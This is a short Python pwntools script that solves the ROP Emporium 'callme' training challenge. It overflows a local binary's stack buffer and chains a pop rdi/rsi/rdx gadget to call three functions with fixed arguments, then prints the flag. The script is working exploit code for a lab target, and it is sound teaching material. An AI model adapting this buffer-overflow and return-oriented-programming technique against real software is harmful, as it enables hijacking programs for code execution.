from pwn import *

#  challenge: https://ropemporium.com/challenge/callme.html
#  task: You must call the callme_one(), callme_two() and callme_three() functions in that order.
#  RDI - arg 1
#  RSI - arg 2
#  RDX - arg 3


# Arguments we will give to the functions
dead_beef = p64(0xdeadbeefdeadbeef)
cafe_babe = p64(0xcafebabecafebabe)
d00d_food = p64(0xd00df00dd00df00d)


# functions we must call
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)


# ROP gadget we will use ( pop rdi ; pop rsi ; pop rdx ; ret )
# pop rdi: we will use this to pop RDI off the stack and send the 'dead_beef' variable as an argument
# pop rsi: we will use this to pop RSI off the stack and send the 'cafe_babe' variable as an argument
# pop rdx: we will use this to pop RDX off the stack and send the 'd00d_food' variable as an argument
# ret: this will return to wherever it was called from
gadget = p64(0x000000000040093c)


# setting up our own stack
payload = b"A" * 40

# pop RDI,RSI & RDX and ret than feed callme_one the three arguments
payload += gadget + dead_beef + cafe_babe + d00d_food
payload += callme_one

# pop RDI,RSI & RDX and ret than feed callme_two the three arguments
payload += gadget + dead_beef + cafe_babe + d00d_food
payload += callme_two

# pop RDI,RSI & RDX and ret than feed callme_three the three arguments
payload += gadget + dead_beef + cafe_babe + d00d_food
payload += callme_three


p = process("./callme")
# send the payload to the program
p.sendline(payload)
# recvuntil the little > input
p.recvuntil(">")
# recv the output ( receive the flag )
print(p.recvall().decode("utf-8"))
